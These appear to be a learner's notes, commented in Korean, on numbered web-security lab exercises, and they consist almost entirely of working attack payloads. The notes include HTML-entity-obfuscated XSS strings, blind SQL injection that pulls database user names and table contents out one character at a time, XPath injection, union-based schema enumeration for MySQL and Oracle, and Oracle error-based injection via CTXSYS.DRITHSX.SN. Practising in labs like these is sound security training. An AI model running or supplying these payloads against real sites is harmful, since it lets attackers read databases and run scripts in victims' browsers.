<img src="" &#x6f&#x6e&#x65&#x72&#x72&#x6f&#x72="javascript:alert('XSS');">
&#x3c&#x73&#x63&#x72&#x69&#x70&#x74&#x3e&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&#x3b&#x3c&#x2f&#x73&#x63&#x72&#x69&#x70&#x74&#x3e
sql
4. php --> infosec
' and '1'='1' #     // sql 인젝션이 되는지 확인
' and ascii(substring((select user()),1,1))>64 # // 첫 글자가 문자임을 확인할 수 있다.
' and ascii(substring((select user()),1,1))>96 # // 첫 글자가 소문자임을 알 수 있다. 
' and ascii(substring((select user()),1,1))>109 # // 첫 글자는 a와  m 사이를 알 수 있다. 결과 조회 불가
' and ascii(substring((select user()),1,1))=105 # // 사이에서 하나씩 대입하면서 찾다보면 i임을 알 수 있다.

' and '1'='1' #     // sql 인젝션이 되는지 확인
' and ascii(substring((select user()),1,1))>64 # // 첫 글자가 문자임을 확인할 수 있다.
' and ascii(substring((select user()),1,1))>96 # // 첫 글자가 소문자임을 알 수 있다. 
' and ascii(substring((select user()),1,1))>109 # // 첫 글자는 m 이후다. 
                                             :
                                             :

4. jsp
' and '1'='1' or '1'='2
' and ascii(substring(select user from dual),1,1))>64 or '1'='2

%' and  ascii(substr((select user from dual),1,1))=73 or '1'='2
==> I
%' and  ascii(substr((select user from dual),2,1))=78 or '1'='2
==> N
%' and  ascii(substr((select user from dual),3,1))=70 or '1'='2
==> F
%' and  ascii(substr((select user from dual),4,1))=54 or '1'='2
==> 6
%' and  ascii(substr((select user from dual),5,1))>0 or '1'='2
==> 오류




41
"or 1=1]["1
"or 1=1] | //* | salary["1



6.
' and '1'='1' #  
' and (select count(*) from answer)=1  # //단일컬럼인지 확인
' and ascii(substring((select * from answer),1,1))>64 # // 문자임을 확인
' and ascii(substring((select * from answer),1,1))>96 # // 첫 글자가 소문자임을 알 수 있다. 
' and ascii(substring((select * from answer),1,1))>109 # // 첫 글자는 a와  m 사이를 알 수 있다. 결과 조회 불가
' and ascii(substring((select * from answer),1,1))>103 #
' and ascii(substring((select * from answer),1,4))=97 # // 결과 조회가 된다. 아스키 코드로 97이므로

' and ascii(substring((select * from answer),2,1))>64 # // 문자임을 확인
' and ascii(substring((select * from answer),2,1))>96 # // 두 번째 글자도 소문자임을 알 수 있다.
' and ascii(substring((select * from answer),2,1))>109 # // 두번쨰글자는 a와  m 사이를 알 수 있다. 결과 조회 불가
' and ascii(substring((select * from answer),2,1))>103 # // 두번쨰글자는 a와  f 사이를 알 수 있다. 결과 조회 불가
' and ascii(substring((select * from answer),2,1))=98 # // 두번쨰글자는 b 임을 확인

' and ascii(substring((select * from answer),3,1))>64 # // 문자임을 확인
' and ascii(substring((select * from answer),3,1))>96 # // 첫 글자가 소문자임을 알 수 있다. 
' and ascii(substring((select * from answer),3,1))>109 # // 첫 글자는 a와  m 사이를 알 수 있다. 결과 조회 불가
' and ascii(substring((select * from answer),3,1))>103 # 
' and ascii(substring((select * from answer),3,1))=99 # //C

' and ascii(substring((select * from answer),4,1))>64 # // 문자임을 확인
' and ascii(substring((select * from answer),4,1))>96 # // 첫 글자가 소문자임을 알 수 있다. 
' and ascii(substring((select * from answer),4,1))>109 # // 첫 글자는 a와  m 사이를 알 수 있다. 결과 조회 불가
' and ascii(substring((select * from answer),4,1))>103 # 
' and ascii(substring((select * from answer),4,1))=99 # //C

' and ascii(substring((select * from answer),5,1))>0 #

8.
a' // 오류가 나오게 한다. 
'# //제목에서 제대로 검색이 가능한 것을 확인가능하다.
' and db_name() > 1# // db 이름이 문자열인데 정수와 비교하여 오류가 나왔다.
' order by 12 #

12.
' and db_name() > 1# // db 이름이 문자열인데 정수와 비교하여 오류가 나왔다.
' union select 1,2,3 # // 1부터 차례대로 해줘도 오류가 난다. 
' union select 1,2,3,4,5 # // 컬럼이 5개
' and 1=2 union select 1,2,3,4,5 #
' and 1=2 union select table_name ,2,3,4,5 from information_schema.tables #
' and 1=2 union select column_name ,2,3,4,5 from information_schema.columns where table_name='union_answer' #
' and 1=2 union select answer_column,2,3,4,5 from union_answer #

' union select null,null,null,null,null --
' and 1=2 union select table_name,null,null,null,null from user_tables --
' and 1=2 union select column_name,null,null,null,null from all_tab_columns where table_name = 'SQL_UNION_ANSWER' --
' and 1=2 union select ANSWER_COLUMN,null,null,null,null from SQL_UNION_ANSWER --


' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from USER_TABLES))=1--
' and CTXSYS.DRITHSX.SN(user,(select table_name from (select table_name,rownum as rnum from USER_TABLES)where rnum =60))=1--
